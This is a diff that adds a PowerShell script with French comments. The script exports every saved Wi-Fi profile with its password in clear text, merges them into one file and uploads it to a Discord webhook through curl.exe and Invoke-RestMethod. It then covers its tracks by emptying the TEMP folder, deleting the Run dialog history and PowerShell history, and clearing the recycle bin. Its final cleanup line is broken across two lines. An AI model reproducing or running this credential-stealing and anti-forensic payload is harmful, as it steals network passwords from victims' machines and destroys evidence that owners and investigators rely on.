@@ -1,0 +1,85 @@
+# ===========================
+# FONCTION : EXPORTER PROFILS WIFI
+# ===========================
+function Export-WiFiProfiles {
+    $tempFolder = "$env:TEMP\WiFi_Profiles"
+    if (-Not (Test-Path $tempFolder)) {
+        New-Item -ItemType Directory -Path $tempFolder | Out-Null
+    }
+
+    # Exporter tous les profils en XML
+    netsh wlan export profile key=clear folder=$tempFolder | Out-Null
+
+    # Créer un XML global
+    [xml]$allProfilesXml = New-Object System.Xml.XmlDocument
+    $root = $allProfilesXml.CreateElement("WiFiProfiles")
+    $allProfilesXml.AppendChild($root) | Out-Null
+
+    Get-ChildItem -Path $tempFolder -Filter *.xml | ForEach-Object {
+        [xml]$profileXml = Get-Content $_.FullName
+        $importedNode = $allProfilesXml.ImportNode($profileXml.WLANProfile, $true)
+        $root.AppendChild($importedNode) | Out-Null
+    }
+
+    # Sauvegarder le fichier unique (même nom que ton exemple : --wifi-pass.txt)
+    $outputFile = "$env:TEMP\--wifi-pass.txt"
+    $allProfilesXml.Save($outputFile)
+
+    return $outputFile
+}
+
+# ===========================
+# FONCTION : UPLOAD VERS DISCORD (déjà fournie)
+# ===========================
+function Upload-Discord {
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text
+    )
+    $hookurl = "$dc"
+    $Body = @{
+        'username' = $env:username
+        'content'  = $text
+    }
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
+    }
+    if (-not ([string]::IsNullOrEmpty($file))) {
+        curl.exe -F "file1=@$file" $hookurl
+    }
+}
+
+# ===========================
+# FONCTION : NETTOYAGE (adaptée à ton Clean-Exfil)
+# ===========================
+function Clean-Exfil {
+    # vider le dossier TEMP
+    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+    # supprimer historique "Exécuter"
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+    # supprimer historique PowerShell
+    Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+    # vider corbeille
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+}
+
+# ===========================
+# MAIN
+# ===========================
+if (-not ([string]::IsNullOrEmpty($dc))) {
+    $wifiFile = Export-WiFiProfiles
+    Upload-Discord -file $wifiFile
+}
+
+if (-not ([string]::IsNullOrEmpty($ce))) {
+    Clean-Exfil
+}
+
+# Supprimer spécifiquement le fichier exporté si présent
+if (Test-Path "$env:TEMP\--wifi-pass.txt") {
+    Remove-Item "$env:TEMP\--wifi-pass.txt" -Force -ErrorAction Silently
+Continue
+}
